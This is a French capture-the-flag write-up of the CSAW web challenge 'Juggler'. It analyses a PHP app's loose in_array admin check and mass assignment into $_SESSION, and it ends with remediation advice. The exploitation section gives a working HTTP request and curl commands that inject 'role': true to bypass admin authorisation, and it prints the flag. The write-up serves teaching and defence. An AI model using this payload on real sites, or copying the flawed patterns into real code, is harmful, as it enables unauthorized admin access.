+++
draft = false
title = 'Juggler'
category = 'Web'
+++

> **Juggling** — the act of tossing and catching two or more **mass**es where at least one is **assign**ed an airborne trajectory at any given time.

<!--more-->

> **Catégorie :** Web
> **Difficulté :** Facile / Moyen
> **Flag :** `csaw{tw0_f0r_0n3_2gc9w2hz}`

---

## Sommaire

- [Description](#description)
- [Reconnaissance](#reconnaissance)
- [Analyse du code source](#analyse-du-code-source)
  - [Le contrôle d'accès admin](#1--le-controle-dacces-admin-adminphp)
  - [La mise à jour de profil](#2--la-mise-a-jour-de-profil-profile_updatephp)
- [La vulnérabilité : PHP Type Juggling](#la-vulnerabilite--php-type-juggling)
- [Exploitation](#exploitation)
- [Flag](#flag)
- [Remédiation](#remediation)
- [Points clés](#points-cles-a-retenir)

---

## Description

> **Juggling** — the act of tossing and catching two or more **mass**es where at least one is **assign**ed an airborne trajectory at any given time.

L'énoncé est un indice déguisé. Les mots mis en évidence (*mass*, *assign*) et le mot **Juggling** pointent directement vers le **PHP Type Juggling** — les comparaisons lâches (`==`) de PHP qui « jonglent » entre les types de données.

---

## Reconnaissance

L'application « Juggler » est un site PHP 8.2 (Apache, SQLite) classique proposant :

- inscription (`register.php`)
- connexion (`login.php`)
- tableau de bord utilisateur (`dashboard.php`)
- **panneau admin (`admin.php`) — contient le flag**

![Page d'accueil](images/Screenshot%202026-09-19%20121000.png)

On commence par créer un compte.

![Inscription](images/Screenshot%202026-09-19%20121013.png)

Une fois connecté, le tableau de bord permet de mettre à jour son profil (nom d'utilisateur / mot de passe) via une requête **JSON**.

![Tableau de bord](images/Screenshot%202026-09-19%20121046.png)

L'objectif est d'accéder à `/admin.php`, mais celui-ci exige un rôle administrateur.

---

## Analyse du code source

### Contexte : les rôles admin sont imprévisibles

Le `Dockerfile` génère **deux rôles admin aléatoires** de 32 caractères `[a-z0-9]` au moment du build :

```dockerfile
RUN admin_role1=$(cat /dev/urandom | tr -dc "a-z0-9" | head -c 32) \
    && admin_role2=$(cat /dev/urandom | tr -dc "a-z0-9" | head -c 32) \
    && sed -i "s/placeholder_admin_role1/$admin_role1/g" config/config.ini \
    && sed -i "s/placeholder_admin_role2/$admin_role2/g" config/config.ini
```

➡️ Impossible de **deviner** ou de **brute-forcer** la valeur du rôle admin. Il faut donc contourner la logique de comparaison, pas la connaître.

### 1 — Le contrôle d'accès admin (`admin.php`)

![Source admin.php](images/Screenshot%202026-09-19%20120906.png)

```php
$config = parse_ini_file(__DIR__ . "/../config/config.ini", true);
$adminRoles = $config["Roles"]["admin_roles"];   // ["<32 chars>", "<32 chars>"]

if (!isset($_SESSION["role"]) ||
    !in_array($_SESSION["role"], $adminRoles)      // ⚠️ comparaison LÂCHE
){
    header("Location: index.php");
    exit();
}
// ... echo file_get_contents("../flag.txt");
```

**Le point faible :** `in_array($_SESSION["role"], $adminRoles)` est appelé **sans le troisième argument `true`**. La recherche se fait donc en **comparaison lâche** (`==`) et non stricte (`===`).

### 2 — La mise à jour de profil (`profile_update.php`)

![Source profile_update.php](images/Screenshot%202026-09-19%20120851.png)

```php
$jsonData = json_decode(file_get_contents("php://input"), true);
// ... validation CSRF + username ...

foreach($jsonData as $jsonKey => $jsonValue){
    if (array_key_exists($jsonKey, $_SESSION))
        $_SESSION[$jsonKey] = $jsonValue;          // ⚠️ écriture arbitraire en session
    if (in_array($jsonKey, $dbColumns, true)){
        $stmt = $pdo->prepare("UPDATE users SET `$jsonKey` = ? WHERE id = ?");
        if ($jsonKey === "password")
            $jsonValue = password_hash($jsonValue, PASSWORD_DEFAULT);
        $stmt->execute([$jsonValue, $_SESSION["user_id"]]);
    }
}
```

**Le second point faible :** le handler itère sur **toutes** les clés du JSON envoyé et, si une clé existe déjà dans `$_SESSION`, il écrase sa valeur **sans aucun filtrage de type**.

Or `role` est bel et bien présent dans la session (posé au login : `$_SESSION["role"] = $user["role"];`). On peut donc **réassigner `$_SESSION["role"]` à la valeur de notre choix** — y compris un type non-string, puisque l'entrée est du JSON.

---

## La vulnérabilité : PHP Type Juggling

En combinant les deux failles :

1. **On écrit `$_SESSION["role"] = true`** (booléen JSON) via `profile_update.php`.
2. **`admin.php` évalue** `in_array(true, $adminRoles)` en comparaison lâche.

En PHP, la comparaison lâche d'un booléen avec une chaîne suit cette règle :

| Comparaison | Résultat |
|---|---|
| `true == "n'importe quelle string NON vide"` | `true` ✅ |
| `true == ""` | `false` |

Comme les rôles admin sont des chaînes de 32 caractères (donc non vides), on obtient :

```php
in_array(true, ["3f8a…(32c)", "9b2c…(32c)"])
// équivaut à : (true == "3f8a…") || (true == "9b2c…")
// équivaut à : true || true  →  TRUE
```

> **Note importante (PHP 8) :** le grand classique `0 == "string"` ne fonctionne **plus** en PHP 8 — depuis cette version, comparer un entier à une chaîne non numérique convertit l'entier en chaîne (`"0" == "abc"` → `false`). C'est pourquoi il faut employer le **booléen `true`**, et non l'entier `0`. C'est là toute la subtilité du challenge, et le double sens du flag `tw0_f0r_0n3` (*two for one* : deux failles pour un exploit).

---

## Exploitation

### Étape 1 — Capturer la requête légitime de mise à jour du profil

Depuis le tableau de bord, on clique sur « Edit Profile » / « Save Changes » et on intercepte la requête `POST /dashboard.php` (Content-Type `application/json`) dans Burp. Elle contient déjà notre `PHPSESSID` et le `csrf_token` valide.

![Requête d'origine](images/Screenshot%202026-09-19%20121101.png)

### Étape 2 — Injecter `"role": true`

Il suffit d'ajouter la clé `role` avec la valeur booléenne `true` au corps JSON, puis d'envoyer.

![Requête modifiée avec role:true](images/Screenshot%202026-09-19%20121133.png)

```http
POST /dashboard.php HTTP/1.1
Host: 10.0.166.224
Content-Type: application/json
Cookie: PHPSESSID=527bd31cf3069b653d872cc73579f205

{
  "username":"JackOrion",
  "password":"pass",
  "csrf_token":"3a8bce6fead2dce76232188ac47f107458133bec978ea93c814ad25850fc53c7",
  "role":true
}
```

Réponse : `{"status":"success"}` → `$_SESSION["role"]` vaut désormais `true`.

### Version en ligne de commande

```bash
URL=http://10.0.166.224
COOKIE="PHPSESSID=527bd31cf3069b653d872cc73579f205"
CSRF="3a8bce6fead2dce76232188ac47f107458133bec978ea93c814ad25850fc53c7"

# 1) Type juggling : role = true (booléen)
curl -s -H "Content-Type: application/json" -b "$COOKIE" \
  -d "{\"username\":\"JackOrion\",\"role\":true,\"csrf_token\":\"$CSRF\"}" \
  "$URL/dashboard.php"

# 2) Récupération du flag
curl -s -b "$COOKIE" "$URL/admin.php"
```

### Étape 3 — Accéder au panneau admin

On visite `/admin.php` avec la même session : le contrôle `in_array(true, $adminRoles)` renvoie `true`, l'accès est accordé.

---

## Flag

![Flag récupéré](images/Screenshot%202026-09-19%20121215.png)

```
csaw{tw0_f0r_0n3_2gc9w2hz}
```

---

## Remédiation

1. **Comparaison stricte.** Toujours passer `true` en troisième argument de `in_array()` :
   ```php
   in_array($_SESSION["role"], $adminRoles, true);   // comparaison ===
   ```
2. **Ne jamais fusionner aveuglément l'entrée utilisateur dans la session.** Il faut une liste blanche explicite des champs modifiables (p. ex. `username`, `password` uniquement) et interdire toute clé sensible comme `role`, `user_id`, etc. :
   ```php
   $allowed = ["username", "password"];
   foreach ($jsonData as $k => $v) {
       if (!in_array($k, $allowed, true)) continue;
       // ...
   }
   ```
3. **Valider/typer les entrées.** N'accepter que des chaînes pour les champs texte et rejeter les types inattendus (booléens, tableaux, `null`).

---

## Points clés à retenir

- `in_array()` / `==` **sans comparaison stricte** = faille de type juggling classique.
- En **PHP 8**, `0 == "string"` est corrigé, mais **`true == "string non vide"` reste `true`** — un vecteur toujours d'actualité.
- Un `foreach` qui recopie l'entrée utilisateur dans `$_SESSION` ou en base **sans liste blanche** est une **mass assignment** (le double sens de l'énoncé : *mass* + *assign*).
- Deux petites erreurs de logique combinées suffisent à un contournement d'authentification complet — *two for one*.
